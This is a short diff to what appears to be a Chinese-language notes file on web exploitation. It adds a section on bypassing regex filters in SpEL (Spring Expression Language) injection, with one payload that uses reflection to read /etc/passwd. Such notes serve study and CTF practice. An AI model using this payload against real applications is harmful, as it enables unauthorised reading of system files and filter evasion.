@@ -3825,6 +3825,12 @@ if __name__ == '__main__':
     exp(en_payload)
 ```
 
+spel 进一步正则绕过
+
+```java
+{''.class.forName('java.nio.file.Files').readString(''.class.forName('java.nio.file.Paths').get('/etc/passwd'))}
+```
+
 #### Java 理论
 
 ##### Java Web 项目目录结构
